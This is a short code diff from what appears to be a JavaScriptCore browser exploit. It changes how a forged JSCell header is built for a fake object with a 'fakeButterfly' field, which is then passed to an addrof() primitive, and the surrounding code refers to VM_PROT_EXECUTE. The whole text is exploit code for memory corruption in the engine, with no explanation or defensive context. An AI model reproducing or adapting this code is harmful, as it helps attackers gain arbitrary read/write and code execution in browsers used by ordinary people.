@@ -412,7 +412,7 @@ var VM_PROT_EXECUTE = 0x4
             return d - kBoxedDoubleOffset;
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = 0x0108230700000000n;
+          let doubleArrayCellHeader = new Int64("0x0108230700000000").asJSValue();
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v,set) {
@@ -486,7 +486,7 @@ var VM_PROT_EXECUTE = 0x4
               return b1[0];
             }
             let obj = {
-              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
+              jsCellHeader: doubleArrayCellHeader,
               fakeButterfly: a0
             };
             let addr = addrof(obj);
